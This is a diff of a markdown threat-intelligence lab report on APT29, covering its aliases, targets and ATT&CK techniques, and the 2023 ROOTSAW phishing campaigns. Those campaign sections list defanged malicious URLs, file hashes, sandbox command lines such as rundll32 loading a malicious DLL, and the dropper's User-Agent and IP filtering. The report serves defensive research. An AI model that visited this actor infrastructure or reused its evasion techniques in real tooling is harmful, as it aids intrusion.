@@ -8,2620 +8,1486 @@ image:
   alt: "APT29 (Cozy Bear) threat-hunting lab report"
 ---
 
-### Quick Review
-
-This is a highly sophisticated Russian state-sponsored cyber espionage group believed to operate under the Russian Foreign Intelligence Service (SVR)
-
-The SVR is the civilian foreign intelligence agency of Russia, which started work in December 1991.
-
-The SVR is tasked with intelligence and espionage activities outside the Russian Federation
-
-![](/assets/img/posts/apt29-hunting/img-001.png)
-
-![](/assets/img/posts/apt29-hunting/img-002.png)
-
-> **Ref:** <https://en.wikipedia.org/wiki/Foreign_Intelligence_Service_(Russia)>
-
-### Known Names
-
-Cozy Bear
-
-The Dukes
-
-IRON HEMLOCK
-
-Nobelium
-
-![](/assets/img/posts/apt29-hunting/img-003.png)
-
-> **Ref:** <https://www.sekoia.io/en/glossary/apt29-aka-nobelium-cozy-bear/>
-
-### What This Group Focuses On
-
-Active since 2008, APT29 is notable for its advanced operational discipline, adaptability, and persistent targeting of well-defended organizations
-
-The group’s primary objectives are cyber espionage against government agencies, political organizations, research institutions, and critical infrastructure.
-
-Its motivation centers on gathering intelligence to support Russian foreign and security policy decision-making, disrupting national security, and influencing political processes
-
-> **Ref:** <https://www.vectra.ai/modern-attack/threat-actors/apt29>
-
-> **Ref:** <https://hedgehogsecurity.co.uk/blog/who-is-apt29>
-
-### Most Targeted Countries
-
-United States: Numerous government agencies (including during the SolarWinds hack), private sector companies, and NGOs ( https://www.sekoia.io/en/glossary/apt29-aka-nobelium-cozy-bear/)
-
-United Kingdom: Government institutions, research organizations, and defense sectors
-
-NATO Countries:
-
-Germany
-
-Norway
-
-Poland
-
-European Union States: Especially those with roles in foreign policy, diplomacy, or international affairs
-
-![](/assets/img/posts/apt29-hunting/img-004.png)
-
-> **Ref:** <https://cyble.com/threat-actor-profiles/apt-29/>
-
-### Most Targeted Sectors
-
-Media
-
-Entertainment
-
-Education
-
-Energy
-
-Healthcare, Pharmaceuticals and Biotechnology
-
-Normal Government business
-
-> **Ref:** <https://cyble.com/threat-actor-profiles/apt-29/>
-
-### Most Common Used Techniques in MitreAtt&ck
-
-## T1566.001 "Phishing: Spearphishing Attachment"
-
-Falls Under Initial Access Category
-
-This technique involves adversaries sending targeted phishing emails that contain malicious attachments,such as Office documents or executable files to trick users into opening them and thereby execute attacker-controlled code or install malware on the victim system:
-
-![](/assets/img/posts/apt29-hunting/img-005.png)
-
-![](/assets/img/posts/apt29-hunting/img-006.png)
-
-> **Ref:** <https://attack.mitre.org/techniques/T1566/001/>
-
-## T1059.001 "Command and Scripting Interpreter: PowerShell"
-
-Adversaries use PowerShell Windows' built-in command-line shell and scripting language to execute malicious commands, scripts, or payloads for initial access, execution, discovery, persistence, or defense evasion
-
-This technique lets attackers automate attacks, bypass security controls, and often operate in file less to avoid detection
-
-![](/assets/img/posts/apt29-hunting/img-007.png)
-
-![](/assets/img/posts/apt29-hunting/img-008.png)
-
-> **Ref:** <https://attack.mitre.org/techniques/T1059/001/>
-
-## T1053.005 "Scheduled Task/Job: Scheduled Task"
-
-Adversaries abuse the Windows Task Scheduler to create or modify scheduled tasks for the initial or recurring execution of malicious code
-
-Which helps achieve persistence, privilege escalation, or remote execution
-
-This technique allows attackers to automate execution of payloads at specific times or system events, often evading detection by blending in with legitimate scheduled tasks
-
-![](/assets/img/posts/apt29-hunting/img-009.png)
-
-![](/assets/img/posts/apt29-hunting/img-010.png)
-
-> **Ref:** <https://attack.mitre.org/techniques/T1053/005/>
-
-## T1021.001 "Remote Services: Remote Desktop Protocol"
-
-Adversaries use valid credentials to log into a remote system using RDP or Remote Desktop Services (RDS), allowing them to perform actions as the logged- on user and move laterally within the network
-
-This technique facilitates interactive sessions with the remote system’s graphical interface, enabling attackers to expand access and control if the service is enabled and credentials are available or stolen
-
-![](/assets/img/posts/apt29-hunting/img-011.png)
-
-![](/assets/img/posts/apt29-hunting/img-012.png)
-
-> **Ref:** <https://attack.mitre.org/techniques/T1021/001/>
-
-## T1003.001 "OS Credential Dumping: LSASS Memory
-
-This technique involves adversaries accessing credential material stored in the memory of the Local Security Authority Subsystem Service (LSASS) process on Windows systems
-
-LSASS holds various credential data such as hashed or cleartext passwords after user logon
-
-Attackers with administrative privileges or SYSTEM access may dump LSASS memory to extract these credentials and then use them for lateral movement or privilege escalation
-
-![](/assets/img/posts/apt29-hunting/img-013.png)
-
-> **Ref:** <https://attack.mitre.org/techniques/T1003/001/>
-
-## T1071.001 "Application Layer Protocol: Web Protocols:"
-
-This technique involves adversaries using common web-related application layer protocols such as HTTP, HTTPS, and WebSocket to communicate with compromised systems
-
-The goal is to blend malicious Command-and-Control (C2) or data exfiltration traffic seamlessly with legitimate web traffic, making it harder for defenders to detect and block
-
-![](/assets/img/posts/apt29-hunting/img-014.png)
-
-![](/assets/img/posts/apt29-hunting/img-015.png)
-
-> **Ref:** <https://attack.mitre.org/techniques/T1071/001/>
+> **About this report.** This document combines open-source threat intelligence on APT29 with a controlled lab where each of the group's signature techniques is emulated end-to-end and then hunted down through detections and forensic artifacts. All offensive activity was performed in an isolated virtual environment for defensive research and education only.
+{: .prompt-info }
 
 ---
 
-### Technical Side
 
-## T1566.001 Phishing: SpearPhishing Attachment
+## 1 · Threat Actor Profile
 
-ID: T1566.001
+### 1.1 Overview
 
-Sub-technique of: T1566
+APT29 is a **highly sophisticated, Russian state-sponsored cyber-espionage group** believed to operate under the **Russian Foreign Intelligence Service (SVR)**.
 
-Tactic: Initial Access
+- The **SVR** is Russia's civilian foreign intelligence agency, established in **December 1991**.
+- It is tasked with intelligence and espionage activities **outside** the Russian Federation.
+- **Active since 2008**, APT29 is notable for its advanced operational discipline, adaptability, and persistent targeting of well-defended organizations.
 
-Platforms: Linux, Windows, macOS
+> 📎 Reference: <https://en.wikipedia.org/wiki/Foreign_Intelligence_Service_(Russia)>
 
-APT29 deployed this attack by sending spear phishing emails targeted at specific individuals or organizations
+### 1.2 Known Aliases
 
-These emails contain malicious attachments such as Microsoft Office documents, executables, PDFs, or archived files
+| Alias | Used by |
+|-------|---------|
+| **Cozy Bear** | CrowdStrike |
+| **The Dukes** | F-Secure |
+| **Nobelium** | Microsoft |
+| **IRON HEMLOCK** | Secureworks |
 
-The attachments often exploit vulnerabilities or contain malicious payloads that execute when the user opens them
+<img src="/assets/img/posts/apt29-hunting/img-002.png" width="520" alt="APT29 known names"/>
 
-They typically disguises these attachments using social engineering tactics to make them appear legitimate and entice the victim to open them, sometimes instructing the victim on how to bypass system protections
+> 📎 Reference: <https://www.sekoia.io/en/glossary/apt29-aka-nobelium-cozy-bear/>
 
-![](/assets/img/posts/apt29-hunting/img-016.png)
+### 1.3 Focus & Objectives
 
-What file types and lure themes APT29 used in past campaigns?
+APT29's primary objective is **cyber espionage** against government agencies, political organizations, research institutions, and critical infrastructure.
 
-Executable files disguised with manipulated extensions or icons
+Its motivation centers on:
 
-PDFs
+- Gathering intelligence to support **Russian foreign and security policy** decision-making.
+- **Disrupting national security** of target nations.
+- **Influencing political processes.**
 
-Archived files like ZIP or RAR (With Password to do exploits in archive handling )
+<img src="/assets/img/posts/apt29-hunting/img-003.png" width="520" alt="APT29 focus"/>
 
-HTML files containing JavaScript droppers implementing HTML smuggling
+> 📎 References: <https://www.vectra.ai/modern-attack/threat-actors/apt29> · <http://hedgehogsecurity.co.uk/blog/who-is-apt29>
 
-Image file formats such as ISO or IMG files containing mounted virtual drives with malicious Windows shortcut (LNK) files and DLLs
+### 1.4 Most Targeted Countries
 
-Remote Desktop Protocol configuration files
+| Country / Bloc | Notes |
+|----------------|-------|
+| 🇺🇸 **United States** | Numerous government agencies (including the **SolarWinds** hack), private-sector companies, and NGOs |
+| 🇬🇧 **United Kingdom** | Government institutions, research organizations, and defense sectors |
+| 🇩🇪🇳🇴🇵🇱 **NATO Countries** | Germany, Norway, Poland |
+| 🇪🇺 **EU States** | Especially those with roles in foreign policy, diplomacy, or international affairs |
 
-### Theories Used
+<img src="/assets/img/posts/apt29-hunting/img-004.png" width="420" alt="Targeted countries"/>
 
-Diplomatic and embassy related themes
+> 📎 Reference: <https://cyble.com/threat-actor-profiles/apt-29/>
 
-Political party and election related lures
+### 1.5 Most Targeted Sectors
 
-COVID-19 related content early in the pandemic ( Expired )
+`Media` · `Entertainment` · `Education` · `Energy` · `Healthcare, Pharmaceuticals & Biotechnology` · `Government`
 
-> **Ref:** <https://cloud.google.com/blog/topics/threat-intelligence/apt29-evolving->
+> 📎 Reference: <https://cyble.com/threat-actor-profiles/apt-29/>
 
-> **Ref:** <https://cloud.google.com/blog/topics/threat-intelligence/tracking-apt29->
+### 1.6 MITRE ATT&CK Techniques at a Glance
 
-> **Ref:** <https://www.rnbo.gov.ua/files/2023_YEAR/CYBERCENTER/november/APT29%2>
+| ID | Technique | Tactic | Summary |
+|----|-----------|--------|---------|
+| **T1566.001** | Spearphishing Attachment | Initial Access | Targeted phishing emails with malicious attachments (Office docs, ISO/IMG, LNK, HTML smuggling) |
+| **T1059.001** | PowerShell | Execution | Obfuscated/encoded PowerShell to run commands, fetch payloads, and move laterally |
+| **T1053.005** | Scheduled Task | Persistence / Priv-Esc | Abuse of Task Scheduler for recurring execution of malicious code |
+| **T1021.001** | Remote Desktop Protocol | Lateral Movement | Valid credentials + RDP for interactive lateral movement |
+| **T1003.001** | LSASS Memory Dumping | Credential Access | Dumping LSASS to extract hashes, tickets, and tokens |
+| **T1071.001** | Web Protocols | Command & Control | HTTP/HTTPS C2 blended into legitimate web traffic |
 
-### Campaigns Analysis
+The following pages of MITRE ATT&CK confirm APT29's use of each technique:
 
-## March 2023: Earthquake-Themed Türkiye Campaign
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-005.png" width="400" alt="T1566.001"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-006.png" width="400" alt="MITRE row T1566.001"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-007.png" width="400" alt="T1059.001"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-009.png" width="400" alt="T1053.005"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-011.png" width="400" alt="T1021.001"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-013.png" width="400" alt="T1003.001"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-014.png" width="400" alt="T1071.001"/></td></tr>
+</table>
 
-In March 2023, Mandiant identified a new APT29 phishing campaign targeting Türkiye, which exploited the recent February 2023 earthquake disaster as a contextual lure. The attackers impersonated the Turkish Deputy Minister of Foreign Affairs and sent phishing emails containing a malicious link paired with earthquake-related content to increase plausibility
+> 📎 Technique references: [T1566.001](https://attack.mitre.org/techniques/T1566/001/) · [T1059.001](https://attack.mitre.org/techniques/T1059/001/) · [T1053.005](https://attack.mitre.org/techniques/T1053/005/) · [T1021.001](https://attack.mitre.org/techniques/T1021/001/) · [T1003.001](https://attack.mitre.org/techniques/T1003/001/) · [T1071.001](https://attack.mitre.org/techniques/T1071/001/)
 
-They Started this first wave by sending phishing mails contains URL "https://tinyurl[.]com/mrxcjsbs"
+---
 
-Hosted URL is Clean
+## 2 · T1566.001 — Spearphishing Attachment
 
-![](/assets/img/posts/apt29-hunting/img-017.png)
+> **ID:** T1566.001 · **Sub-technique of:** T1566 · **Tactic:** Initial Access · **Platforms:** Linux, Windows, macOS
 
-URL isn't Clean
+APT29 sends spearphishing emails to specific individuals or organizations. The emails carry malicious attachments — Microsoft Office documents, executables, PDFs, or archive files — that exploit vulnerabilities or execute a payload when opened. Social-engineering lures make the attachments appear legitimate, and victims are sometimes coached on how to bypass system protections.
 
-![](/assets/img/posts/apt29-hunting/img-018.png)
+<img src="/assets/img/posts/apt29-hunting/img-016.png" width="460" alt="T1566.001 MITRE detail"/>
 
-![](/assets/img/posts/apt29-hunting/img-019.png)
+### 2.1 File Types & Lure Themes
 
-From Community: TinyURL.com _is_, and to my knowledge always has been, completely safe as long as it isn't performing its mission, its main reason for existence, which is to redirect links, to its customer-assigned subdirectories known as "tinyurls", to external locations. When it does fulfill its mission, just about anything can happen; in fact, in every spam email I receive that contains TinyURL links, those links infallibly obfuscate and redirect to malicious landing pages.
+**File types observed in past campaigns:**
 
-> **Ref:** <https://www.virustotal.com/gui/domain/tinyurl.com/community>
+- Executables disguised with manipulated extensions or icons
+- PDFs
+- Password-protected archives (ZIP / RAR — used to abuse archive-handling exploits)
+- HTML files containing JavaScript droppers (**HTML smuggling**)
+- Disk-image formats (**ISO / IMG**) containing mounted virtual drives with malicious Windows shortcut (**LNK**) files and DLLs
+- Remote Desktop Protocol (**.rdp**) configuration files
 
-![](/assets/img/posts/apt29-hunting/img-020.png)
+**Lure themes:**
 
-it used to redirect to a ROOTSAW dropper hosted on an actor- controlled compromised website "https://www[.]willyminiatures[.]com/e- yazi.htm/?v=bc78a8d162c6"
+- Diplomatic and embassy-related themes
+- Political party and election-related lures
+- COVID-19 content (early pandemic — now retired)
 
-Dropper Name: e-yazi.htm
+<img src="/assets/img/posts/apt29-hunting/img-017.png" width="420" alt="Lure themes"/>
 
-Dropped File Hash:
-4527057000a4b06f000983b5b61cc85c10f03691fa17d5c51a9fd0b2428
-0662d
+> 📎 References: [APT29 evolving diplomatic phishing](https://cloud.google.com/blog/topics/threat-intelligence/apt29-evolving-diplomatic-phishing) · [Tracking APT29 phishing](https://cloud.google.com/blog/topics/threat-intelligence/tracking-apt29-phishing-campaigns) · [RNBO CVE-2023-38831 report](https://www.rnbo.gov.ua/files/2023_YEAR/CYBERCENTER/november/APT29%20attacks%20Embassies%20using%20CVE-2023-38831%20-%20report%20en.pdf)
 
-![](/assets/img/posts/apt29-hunting/img-021.png)
+### 2.2 Campaign Analysis (2023 Timeline)
 
-it drops ISO File
+```
+Mar 2023 ──► Türkiye earthquake lure ──► European diplomatic ──► Apr 2023 "Old Wine" (Czechia)
+   │                                                                      │
+   └──────────────► May 2023 Kyiv (BMW + charity) ──► Jun 2023 Split ROOTSAW ──► Jul 2023 ICEBEAT
+```
 
-ISO File: e-yazi.iso
+#### 🗓️ March 2023 — Earthquake-Themed Türkiye Campaign
 
-Real File Name: a8jet3l1v.exe
+In March 2023, **Mandiant** identified an APT29 phishing campaign targeting **Türkiye** that exploited the February 2023 earthquake disaster as a contextual lure. The attackers impersonated the **Turkish Deputy Minister of Foreign Affairs** and paired a malicious link with earthquake-related content to increase plausibility.
 
-File Hash:
-948c62e8d953038b6a0030136cb82f55a8251db2c165ca07c01a7568f4
-644240
+**First wave** — phishing email containing the URL `https://tinyurl[.]com/mrxcjsbs`.
 
-Another Known Names:
+<img src="/assets/img/posts/apt29-hunting/img-018.png" width="420" alt="TinyURL lure"/>
 
-4527057000a4b06f000983b5b61cc85c10f03691fa17d5c51a9fd0b24280662 d.bin output.229384142.txt
+> **On TinyURL:** TinyURL.com itself is safe — until it performs its core function: redirecting a customer-assigned "tinyurl" to an external location. In malicious campaigns these links reliably obfuscate and redirect to malicious landing pages.
+> 📎 <https://www.virustotal.com/gui/domain/tinyurl.com/community>
+{: .prompt-warning }
 
-### Meta Data
+The link redirected to a **ROOTSAW** dropper hosted on the actor-controlled compromised site `https://www[.]willyminiatures[.]com/e-yazi.htm/?v=bc78a8d162c6`.
 
-Magic: HTML document, ASCII text, with very long lines (65356u)
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-019.png" width="380" alt="redirect evidence"/></td><td><img src="/assets/img/posts/apt29-hunting/img-020.png" width="380" alt="redirect evidence"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-021.png" width="380" alt="dropper"/></td><td><img src="/assets/img/posts/apt29-hunting/img-022.png" width="380" alt="ISO drop"/></td></tr>
+</table>
 
-Magika: HTML
+| Field | Value |
+|-------|-------|
+| **Dropper name** | `e-yazi.htm` |
+| **Dropped file (SHA-256)** | `4527057000a4b06f000983b5b61cc85c10f03691fa17d5c51a9fd0b24280662d` |
+| **Drops** | ISO file `e-yazi.iso` |
+| **Real file name** | `a8jet3l1v.exe` |
+| **File hash (SHA-256)** | `948c62e8d953038b6a0030136cb82f55a8251db2c165ca07c01a7568f4644240` |
+| **Magic** | HTML document, ASCII text, with very long lines |
+| **File size** | 4.09 MB (4,288,788 bytes) |
+| **First seen (VT)** | 2023-03-28 13:57 UTC |
 
-File Size: 4.09 MB (4288788 bytes)
+**Second wave** — victims were redirected to `https://simplesalsamix[.]com/e-yazi.html`, which dropped the ROOTSAW dropper `e-yazi.html`.
 
-First Seen In The Wild: 2023-03-28 13:57 UTC (VT)
+<img src="/assets/img/posts/apt29-hunting/img-024.png" width="380" alt="second wave"/>
 
-Then they go to second wave:
+| Field | Value |
+|-------|-------|
+| **File name** | `e-yazi.html` (real: `download.html`) |
+| **File hash (SHA-256)** | `cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59a` |
+| **File size** | 1.02 MB (1,066,185 bytes) |
+| **Also dropped via ZIP** | `e-yazi.zip` (real: `a557245e-c62a-433c-8df9-c2d6f0819d7d.tmp`) |
+| **ZIP hash (SHA-256)** | `0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839` |
 
-Victims were again directed to an actor-controlled compromised website "https://simplesalsamix[.]com/e-yazi.html"
+**ROOTSAW analysis** — tria.ge score 5/10. The dropper targeted:
 
-![](/assets/img/posts/apt29-hunting/img-022.png)
+- `e-yazi.pdf`
+- `e-yazi.docx .exe` ← **double-extension** file (phishing trick)
+- `Mso20Win32Client.DLL`
+- `AppvIsvSubsystems64.dll`
 
-Redirect to Download ROOTSAW dropper "e-yazi.html"
+<img src="/assets/img/posts/apt29-hunting/img-025.png" width="420" alt="ROOTSAW analysis"/>
 
-File Name: e-yazi.html
+**Command lines on `AppvIsvSubsystems64.dll`:**
 
-Real File Name: download.html
-
-File Hash:
-cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4
-a59a
-
-### Meta Data
-
-Magic HTML document, ASCII text, with very long lines (65343u)
-
-Magika: HTML
-File size: 1.02 MB (1066185 bytes)
-
-it can dropped also by ZIP File
-
-File Name: e-yazi.zip
-
-Real File Name: a557245e-c62a-433c-8df9-c2d6f0819d7d.tmp
-
-File Hash:
-0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d
-3997018839
-
-ROOTSAW Analysis:
-
-tria.ge Score 5/10
-
-![](/assets/img/posts/apt29-hunting/img-023.png)
-
-### File Targets
-
-e-yazi.pdf e-yazi.docx.exe ( Double Extension File, Might Used in Phishing )
-
-Mso20Win32Client.DLL
-
-AppvIsvSubsystems64.dll
-
-![](/assets/img/posts/apt29-hunting/img-024.png)
-
-### CommandLines on AppvIsvSubsystems64.dll
-
-rundll32.exe C:\Users\Admin\AppData\Local\Temp\AppvIsvSubsystems64.dll,#1
-
+```text
+rundll32.exe  C:\Users\Admin\AppData\Local\Temp\AppvIsvSubsystems64.dll,#1
 C:\Windows\system32\WerFault.exe -pss -s 188 -p 2516 -ip 2516
-
 C:\Windows\system32\WerFault.exe -u -p 2516 -s 224
-
-Process Tree: rundll32.exe > AppvIsvSubsystems64.dll OR WerFault.exe > rundll32.exe > AppvIsvSubsystems64.dll
-
-File Located in " C:\Users\
-
-[User]\AppData\Local\Temp\AppvIsvSubsystems64.dll "
-
-![](/assets/img/posts/apt29-hunting/img-025.png)
-
-CommandLines on e-yazi.pdf: -
-
-![](/assets/img/posts/apt29-hunting/img-026.png)
-
-Once file opened all below executions done
-
-C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe
-
-```
-"C:\Program Files (x86)\Adobe\Acrobat Reader
-DC\Reader\AcroRd32.exe"
-"C:\Users\Admin\AppData\Local\Temp\e-yazi.pdf"
 ```
 
-C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --backgroundcolor=16514043
+**Process tree:**
+```
+rundll32.exe ─► AppvIsvSubsystems64.dll
+   └── (or) WerFault.exe ─► rundll32.exe ─► AppvIsvSubsystems64.dll
+```
+File location: `C:\Users\[User]\AppData\Local\Temp\AppvIsvSubsystems64.dll`
 
-C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --type=gpu-process --disable- pack-loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- gpu-preferences=GAAAAAAAAAAAB4AAAQAAAAAAAAAAAGAA --use-gl=swiftshader-webgl --gpu-vendor-id=0x1234 --gpu-device- id=0x1111 --gpu-driver-vendor="Google Inc." --gpu-driver- version=3.3.0.2 --gpu-driver-date=2017/04/07 --disable-pack- loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- service-request-channel- token=304692D19934435CC2B082688E506469 --mojo-platform- channel-handle=1728 --allow-no-sandbox-job --ignored=" -- type=renderer " /prefetch:2
+<img src="/assets/img/posts/apt29-hunting/img-026.png" width="420" alt="execution detail"/>
 
-C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --type=renderer --disable- browser-side-navigation --disable-gpu-compositing --service-pipe- token=9E871AFBE76B099FF0CD04A4DD99AB81 --lang=en-US - -disable-pack-loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- enable-pinch --device-scale-factor=1 --num-raster-threads=2 -- enable-main-frame-before-activation --enable-gpu-async-worker- context --content-image-texture- target=0,0,3553;0,1,3553;0,2,3553;0,3,3553;0,4,3553;0,5,3553;0, 6,3553;0,7,3553;0,8,3553;0,9,3553;0,10,3553;0,11,3553;0,12,355 3;0,13,3553;0,14,3553;0,15,3553;0,16,3553;0,17,3553;0,18,3553; 1,0,3553;1,1,3553;1,2,3553;1,3,3553;1,4,3553;1,5,3553;1,6,3553; 1,7,3553;1,8,3553;1,9,3553;1,10,3553;1,11,3553;1,12,3553;1,13,3 553;1,14,3553;1,15,3553;1,16,3553;1,17,3553;1,18,3553;2,0,355 3;2,1,3553;2,2,3553;2,3,3553;2,4,3553;2,5,3553;2,6,3553;2,7,355 3;2,8,3553;2,9,3553;2,10,3553;2,11,3553;2,12,3553;2,13,3553;2,1 4,3553;2,15,3553;2,16,3553;2,17,3553;2,18,3553;3,0,3553;3,1,35 53;3,2,3553;3,3,3553;3,4,3553;3,5,3553;3,6,3553;3,7,3553;3,8,35 53;3,9,3553;3,10,3553;3,11,3553;3,12,3553;3,13,3553;3,14,3553; 3,15,3553;3,16,3553;3,17,3553;3,18,3553;4,0,3553;4,1,3553;4,2, 3553;4,3,3553;4,4,3553;4,5,3553;4,6,3553;4,7,3553;4,8,3553;4,9, 3553;4,10,3553;4,11,3553;4,12,3553;4,13,3553;4,14,3553;4,15,35 53;4,16,3553;4,17,3553;4,18,3553;5,0,3553;5,1,3553;5,2,3553;5, 3,3553;5,4,3553;5,5,3553;5,6,3553;5,7,3553;5,8,3553;5,9,3553;5, 10,3553;5,11,3553;5,12,3553;5,13,3553;5,14,3553;5,15,3553;5,16
+**Command lines on `e-yazi.pdf`** — once opened, Adobe Acrobat Reader spawns its CEF render processes:
 
-,3553;5,17,3553;5,18,3553;6,0,3553;6,1,3553;6,2,3553;6,3,3553; 6,4,3553;6,5,3553;6,6,3553;6,7,3553;6,8,3553;6,9,3553;6,10,355 3;6,11,3553;6,12,3553;6,13,3553;6,14,3553;6,15,3553;6,16,3553; 6,17,3553;6,18,3553 --disable-accelerated-video-decode -- service-request-channel- token=9E871AFBE76B099FF0CD04A4DD99AB81 --renderer- client-id=2 --mojo-platform-channel-handle=1740 --allow-no- sandbox-job /prefetch:1
-
-C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --type=gpu-process --disable- pack-loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- gpu-preferences=GAAAAAAAAAAAB4AAAQAAAAAAAAAAAGAA --use-gl=swiftshader-webgl --gpu-vendor-id=0x1234 --gpu-device- id=0x1111 --gpu-driver-vendor="Google Inc." --gpu-driver- version=3.3.0.2 --gpu-driver-date=2017/04/07 --disable-pack- loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- service-request-channel- token=CBE6FFF9C1CF83457362879D39EB229F --mojo- platform-channel-handle=2316 --allow-no-sandbox-job --ignored=" --type=renderer " /prefetch:2
-
+```text
+"C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe"
+   "C:\Users\Admin\AppData\Local\Temp\e-yazi.pdf"
+"...\AcroCEF\RdrCEF.exe" --backgroundcolor=16514043
+"...\AcroCEF\RdrCEF.exe" --type=gpu-process ...
+"...\AcroCEF\RdrCEF.exe" --type=renderer ...
 C:\Windows\System32\CompPkgSrv.exe -Embedding
+```
+**Process tree:** `e-yazi.pdf ─► AcroRd32.exe ─► RdrCEF.exe ─► (child commands)`
 
-Process Tree: e-yazi.pdf > AcroRd32.exe > RdrCEF.exe > Other
+**Command lines on `e-yazi.docx .exe`:**
+```text
+C:\Users\Admin\AppData\Local\Temp\e-yazi.docx .exe
+sihost.exe
+taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
+```
 
-### Commands
+<img src="/assets/img/posts/apt29-hunting/img-027.png" width="380" alt="docx.exe execution"/>
 
-### CommandLines on e-yazi.docx .exe
+#### 🗓️ March 2023 — European Diplomatic-Focused Campaigns
 
-C:\Users\Admin\AppData\Local\Temp\e-yazi.docx.exe sihost.exe taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
+Within the two weeks between the Türkiye campaign, APT29 targeted multiple diplomatic missions in Europe with **two new ROOTSAW variants** that moved the anti-analysis guardrails **server-side**.
 
-![](/assets/img/posts/apt29-hunting/img-027.png)
+The lure was a PDF inviting the recipient to a **drinks reception** following an event on the *"Future of International Economic Relations."* The PDF linked to ROOTSAW hosted at `https://parquesanrafael[.]cl/note.html`.
 
-### How Does Malware Affect the Victim
+<img src="/assets/img/posts/apt29-hunting/img-028.png" width="380" alt="European diplomatic lure"/>
 
-APT29 incorporated a new version of its ROOTSAW dropper that includes enhanced anti-analysis and evasion capabilities to improve its success rate and avoid detection. The key features of this updated variant are User-Agent Filtering : The dropper checks the user-agent string of the connecting device. It specifically looks for systems running a Windows operating system, identified by the "Windows NT" value, while also ensuring the string does not contain ".NET"
+| Field | Value |
+|-------|-------|
+| **File name** | `Note.pdf` |
+| **File hash (SHA-256)** | `46c8289301129c0833529495f4f3748b5adff78e18f1427654cb3b59735 2873e` *(highly reported)* |
+| **Magic** | PDF document, version 1.5, 1 page |
+| **File size** | 59.70 KB (61,135 bytes) |
 
-Decoy File Delivery : If the target system does not meet these specific criteria (i.e., it is a non-Windows OS or the request comes from a.NET environment), the server delivers a benign decoy PDF file instead of the malicious payload. This tactic is designed to thwart automated analysis tools and sandboxes, which often do not run on standard Windows configurations, thus preventing them from capturing the actual malware
+This ROOTSAW variant sends the victim's **User-Agent** to the compromised server via an HTTP GET request:
+`https://parquesanrafael[.]cl/note.php?ua=`
 
-Consistent Decoys : In one of the observed campaign waves, the decoy PDF served to filtered-out targets was identical to the one included in the malicious ZIP payload intended for valid targets. This maintains consistency and reduces suspicion
+The server filters against an actor-defined **deny-list** and returns the payload decryption key only if the checks pass. On failure, ROOTSAW drops a **corrupt file** rather than exposing the embedded decoy (a change from earlier versions).
 
-Payload Obfuscation : Each malicious payload within the ROOTSAW dropper is obfuscated using a unique key. While the keys are different for each payload, the deobfuscation routine remains the same, adding a layer of complexity for analysts attempting to reverse-engineer the malware
+**Second wave** — a new ROOTSAW variant with **both User-Agent and IP filtering**, ultimately leading to the same **MUSKYBEAT** downloader.
 
-![](/assets/img/posts/apt29-hunting/img-028.png)
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-029.png" width="380" alt="UA filtering"/></td><td><img src="/assets/img/posts/apt29-hunting/img-030.png" width="380" alt="UA filtering"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-031.png" width="380" alt="filtering"/></td><td><img src="/assets/img/posts/apt29-hunting/img-032.png" width="380" alt="filtering"/></td></tr>
+</table>
 
-## March 2023: European Diplomatic-Focused Phishing Campaigns
+| Field | Value |
+|-------|-------|
+| **File name** | `note.html` / `92a5be...4072f1_JC.html` |
+| **File hash (SHA-256)** | `92a5be2893743435b79e94aa64a74233a2240fd790ca948e1cb046da5b4072f1` *(reported)* |
+| **Magic** | HTML document, ASCII text, with very long lines |
+| **File size** | 3.42 MB (3,587,003 bytes) |
 
-Also in March 2023, APT29 targeted various diplomatic missions in Europe in the two weeks that lapsed between the Turkey campaign, further changes were identified resulting in two new variants of ROOTSAW that shifted the newly added anti-analysis guardrails server side
-
-They sent a mail contained PDF file, this mails asks user for invitation to a drink reception following an event on the "Future of International Economic Relations"
-
-This PDF Contains a Link to malicious web site hosted the ROOTSAW on "https[]:]//parquesanrafael[.]cl/note.html"
-
-![](/assets/img/posts/apt29-hunting/img-029.png)
-
-![](/assets/img/posts/apt29-hunting/img-030.png)
-
-![](/assets/img/posts/apt29-hunting/img-031.png)
-
